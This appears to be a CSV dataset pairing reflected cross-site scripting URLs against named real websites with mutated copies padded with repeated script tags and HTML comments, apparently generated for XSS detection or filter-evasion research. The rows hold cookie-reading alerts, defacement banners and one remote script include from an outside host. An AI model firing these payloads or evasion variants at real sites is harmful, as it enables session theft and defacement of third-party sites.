Payloads,Original
http://www.smileyreferrals4you.com/members/register.php?ref=&quot;&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;alert(document.cookie);&lt;/scrip<br>t<!--Comment-->&gt;&lt;/scrip<br>t<!--Comment-->&gt;&lt;/scrip<br>t<!--Comment-->&gt;&lt;/scrip<br>t<!--Comment-->&gt;&lt;/scrip<br>t<!--Comment-->&gt;&lt;/scrip<br>t<!--Comment-->&gt;&lt;/scrip<br>t<!--Comment-->&gt;&lt;/scrip<br>t<!--Comment-->&gt;&lt;/scrip<br>t<!--Comment-->&gt;&lt;/scrip<br>t<!--Comment-->&gt;&lt;/scrip<br>t<!--Comment-->&gt;&lt;/scrip<br>t<!--Comment-->&gt;&lt;/scrip<br>t<!--Comment-->&gt;&lt;/scrip<br>t<!--Comment-->&gt;&lt;/scrip<br>t<!--Comment-->&gt;&lt;/scrip<br>t<!--Comment-->&gt;,http://www.smileyreferrals4you.com/members/register.php?ref=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/scrip<br>t&gt;
http://www.54ab.com/news.asp?name=%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3ealert(/st@r-gaz3r/)%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3cmarquee<!--Comment-->%3e%3cmarquee<!--Comment-->%3e%3cmarquee<!--Comment-->%3e%3cmarquee<!--Comment-->%3e%3cmarquee<!--Comment-->%3e%3cmarquee<!--Comment-->%3e%3cmarquee<!--Comment-->%3e%3cmarquee<!--Comment-->%3e%3cmarquee<!--Comment-->%3e%3cmarquee<!--Comment-->%3e%3cmarquee<!--Comment-->%3e%3cmarquee<!--Comment-->%3e%3cmarquee<!--Comment-->%3e%3cmarquee<!--Comment-->%3e%3cmarquee<!--Comment-->%3e%3cmarquee<!--Comment-->%3e%3c<!--Comment-->h1%3e%3c<!--Comment-->h1%3e%3c<!--Comment-->h1%3e%3c<!--Comment-->h1%3e%3c<!--Comment-->h1%3e%3c<!--Comment-->h1%3e%3c<!--Comment-->h1%3e%3c<!--Comment-->h1%3e%3c<!--Comment-->h1%3e%3c<!--Comment-->h1%3e%3c<!--Comment-->h1%3e%3c<!--Comment-->h1%3e%3c<!--Comment-->h1%3e%3c<!--Comment-->h1%3e%3c<!--Comment-->h1%3e%3c<!--Comment-->h1%3es<br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->>t@r-gaz3r%3c<!--Comment-->/h1%3e%3c<!--Comment-->/h1%3e%3c<!--Comment-->/h1%3e%3c<!--Comment-->/h1%3e%3c<!--Comment-->/h1%3e%3c<!--Comment-->/h1%3e%3c<!--Comment-->/h1%3e%3c<!--Comment-->/h1%3e%3c<!--Comment-->/h1%3e%3c<!--Comment-->/h1%3e%3c<!--Comment-->/h1%3e%3c<!--Comment-->/h1%3e%3c<!--Comment-->/h1%3e%3c<!--Comment-->/h1%3e%3c<!--Comment-->/h1%3e%3c<!--Comment-->/h1%3e%3c/marquee<!--Comment-->%3e%3c/marquee<!--Comment-->%3e%3c/marquee<!--Comment-->%3e%3c/marquee<!--Comment-->%3e%3c/marquee<!--Comment-->%3e%3c/marquee<!--Comment-->%3e%3c/marquee<!--Comment-->%3e%3c/marquee<!--Comment-->%3e%3c/marquee<!--Comment-->%3e%3c/marquee<!--Comment-->%3e%3c/marquee<!--Comment-->%3e%3c/marquee<!--Comment-->%3e%3c/marquee<!--Comment-->%3e%3c/marquee<!--Comment-->%3e%3c/marquee<!--Comment-->%3e%3c/marquee<!--Comment-->%3e,http://www.54ab.com/news.asp?name=%3cscript%3ealert(/st@r-gaz3r/)%3c/script%3e%3cmarquee%3e%3ch1%3es<br>t@r-gaz3r%3c/h1%3e%3c/marquee%3e
https://resellertest.enom.com/login.asp?page=&quot;&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;alert(&quot;nemessis-www.rstzone.org-ie6only&quot;)&lt;/sc<br<!--Comment-->>ript&gt;&lt;/sc<br<!--Comment-->>ript&gt;&lt;/sc<br<!--Comment-->>ript&gt;&lt;/sc<br<!--Comment-->>ript&gt;&lt;/sc<br<!--Comment-->>ript&gt;&lt;/sc<br<!--Comment-->>ript&gt;&lt;/sc<br<!--Comment-->>ript&gt;&lt;/sc<br<!--Comment-->>ript&gt;&lt;/sc<br<!--Comment-->>ript&gt;&lt;/sc<br<!--Comment-->>ript&gt;&lt;/sc<br<!--Comment-->>ript&gt;&lt;/sc<br<!--Comment-->>ript&gt;&lt;/sc<br<!--Comment-->>ript&gt;&lt;/sc<br<!--Comment-->>ript&gt;&lt;/sc<br<!--Comment-->>ript&gt;&lt;/sc<br<!--Comment-->>ript&gt;,https://resellertest.enom.com/login.asp?page=&quot;&gt;&lt;script&gt;alert(&quot;nemessis-www.rstzone.org-ie6only&quot;)&lt;/sc<br>ript&gt;
http://www.bombardier.com/en/redirect?url=twitter.com%22%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3ealert('xss')%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e,http://www.bombardier.com/en/redirect?url=twitter.com%22%3e%3cscript%3ealert('xss')%3c/script%3e
http://pds.jpl.nasa.gov/tools/data_dictionary_lookup.cfm?obj=n&amp;search_field=%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3ealert(%22xss<br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->>%22)%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e&amp;submit=search,http://pds.jpl.nasa.gov/tools/data_dictionary_lookup.cfm?obj=n&amp;search_field=%3cscript%3ealert(%22xss<br>%22)%3c/script%3e&amp;submit=search
http://www.grants.ord.sa.gov.au/search.asp?keyword=%22%3cscript+src%3dhttp://vuln.xssed.net/thirdpar<br<!--Comment-->>ty/scripts/hotpockets.js%3e%3cscript+src%3dhttp://vuln.xssed.net/thirdpar<br<!--Comment-->>ty/scripts/hotpockets.js%3e%3cscript+src%3dhttp://vuln.xssed.net/thirdpar<br<!--Comment-->>ty/scripts/hotpockets.js%3e%3cscript+src%3dhttp://vuln.xssed.net/thirdpar<br<!--Comment-->>ty/scripts/hotpockets.js%3e%3cscript+src%3dhttp://vuln.xssed.net/thirdpar<br<!--Comment-->>ty/scripts/hotpockets.js%3e%3cscript+src%3dhttp://vuln.xssed.net/thirdpar<br<!--Comment-->>ty/scripts/hotpockets.js%3e%3cscript+src%3dhttp://vuln.xssed.net/thirdpar<br<!--Comment-->>ty/scripts/hotpockets.js%3e%3cscript+src%3dhttp://vuln.xssed.net/thirdpar<br<!--Comment-->>ty/scripts/hotpockets.js%3e,http://www.grants.ord.sa.gov.au/search.asp?keyword=%22%3cscript+src%3dhttp://vuln.xssed.net/thirdpar<br>ty/scripts/hotpockets.js%3e
http://www.cossmil.gov.bo/hospimil/postales/tools/calendar.php?month=&quot;&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;alert(document.cookie<br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->>)&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;&lt;/script<!--Comment-->&gt;,http://www.cossmil.gov.bo/hospimil/postales/tools/calendar.php?month=&quot;&gt;&lt;script&gt;alert(document.cookie<br>)&lt;/script&gt;
http://www.atomicbobs.com/search.php?filter=default&amp;keyword=%22%3e%27%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3ealert(123)%3c/sc<br<!--Comment-->>ript%3e%3c/sc<br<!--Comment-->>ript%3e%3c/sc<br<!--Comment-->>ript%3e%3c/sc<br<!--Comment-->>ript%3e%3c/sc<br<!--Comment-->>ript%3e%3c/sc<br<!--Comment-->>ript%3e%3c/sc<br<!--Comment-->>ript%3e%3c/sc<br<!--Comment-->>ript%3e%3c/sc<br<!--Comment-->>ript%3e%3c/sc<br<!--Comment-->>ript%3e%3c/sc<br<!--Comment-->>ript%3e%3c/sc<br<!--Comment-->>ript%3e%3c/sc<br<!--Comment-->>ript%3e%3c/sc<br<!--Comment-->>ript%3e%3c/sc<br<!--Comment-->>ript%3e%3c/sc<br<!--Comment-->>ript%3e,http://www.atomicbobs.com/search.php?filter=default&amp;keyword=%22%3e%27%3e%3cscript%3ealert(123)%3c/sc<br>ript%3e
http://sexicq.ru/topic.php?id=%27%22%3e%3c/title<!--Comment-->%3e%3c/title<!--Comment-->%3e%3c/title<!--Comment-->%3e%3c/title<!--Comment-->%3e%3c/title<!--Comment-->%3e%3c/title<!--Comment-->%3e%3c/title<!--Comment-->%3e%3c/title<!--Comment-->%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3ealert(%22xss%22);%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->marq<br>uee%20bgcolor=%22red%22%3e%3c<!--Comment-->marq<br>uee%20bgcolor=%22red%22%3e%3c<!--Comment-->marq<br>uee%20bgcolor=%22red%22%3e%3c<!--Comment-->marq<br>uee%20bgcolor=%22red%22%3e%3c<!--Comment-->marq<br>uee%20bgcolor=%22red%22%3e%3c<!--Comment-->marq<br>uee%20bgcolor=%22red%22%3e%3c<!--Comment-->marq<br>uee%20bgcolor=%22red%22%3e%3c<!--Comment-->marq<br>uee%20bgcolor=%22red%22%3e%3ch1<!--Comment-->%3e%3ch1<!--Comment-->%3e%3ch1<!--Comment-->%3e%3ch1<!--Comment-->%3e%3ch1<!--Comment-->%3e%3ch1<!--Comment-->%3e%3ch1<!--Comment-->%3e%3ch1<!--Comment-->%3exss%20by%20xylitol%3c<!--Comment-->/h1%3e%3c<!--Comment-->/h1%3e%3c<!--Comment-->/h1%3e%3c<!--Comment-->/h1%3e%3c<!--Comment-->/h1%3e%3c<!--Comment-->/h1%3e%3c<!--Comment-->/h1%3e%3c<!--Comment-->/h1%3e%3c/marquee<!--Comment-->%3e%3c/marquee<!--Comment-->%3e%3c/marquee<!--Comment-->%3e%3c/marquee<!--Comment-->%3e%3c/marquee<!--Comment-->%3e%3c/marquee<!--Comment-->%3e%3c/marquee<!--Comment-->%3e%3c/marquee<!--Comment-->%3e,http://sexicq.ru/topic.php?id=%27%22%3e%3c/title%3e%3cscript%3ealert(%22xss%22);%3c/script%3e%3cmarq<br>uee%20bgcolor=%22red%22%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e
http://harmanim.co.il/index/search.php?search=%27%22%3e%3c<!--Comment-->%2ftitle%3e%3c<!--Comment-->%2ftitle%3e%3c<!--Comment-->%2ftitle%3e%3c<!--Comment-->%2ftitle%3e%3c<!--Comment-->%2ftitle%3e%3c<!--Comment-->%2ftitle%3e%3c<!--Comment-->%2ftitle%3e%3c<!--Comment-->%2ftitle%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3ealert(1337)%3c%2fsc<br<!--Comment-->>ript%3e%3c%2fsc<br<!--Comment-->>ript%3e%3c%2fsc<br<!--Comment-->>ript%3e%3c%2fsc<br<!--Comment-->>ript%3e%3c%2fsc<br<!--Comment-->>ript%3e%3c%2fsc<br<!--Comment-->>ript%3e%3c%2fsc<br<!--Comment-->>ript%3e%3c%2fsc<br<!--Comment-->>ript%3e%d7%97%d7%a4%d7%a9+%d7%95%d7%99%d7%93%d7%90%d7%95,http://harmanim.co.il/index/search.php?search=%27%22%3e%3c%2ftitle%3e%3cscript%3ealert(1337)%3c%2fsc<br>ript%3e%d7%97%d7%a4%d7%a9+%d7%95%d7%99%d7%93%d7%90%d7%95
